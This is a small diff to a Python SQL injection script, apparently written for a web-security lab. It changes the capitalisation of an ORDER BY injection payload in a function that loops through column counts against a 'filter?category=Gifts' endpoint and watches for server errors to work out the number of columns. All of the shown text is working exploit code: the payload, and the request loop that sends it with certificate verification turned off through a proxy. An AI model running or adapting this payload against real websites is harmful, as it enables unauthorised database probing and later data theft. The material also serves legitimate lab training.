@@ -12,7 +12,7 @@ proxies = {
 def exploit_sqli_column_number(url):
     path = "filter?category=Gifts"
     for i in range(1,50):
-        sql_payload = "'+order+by+%s--" %i
+        sql_payload = "'+Order+By+%s--" %i
         r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
         res = r.text
         if "Internal Server Error" in res:
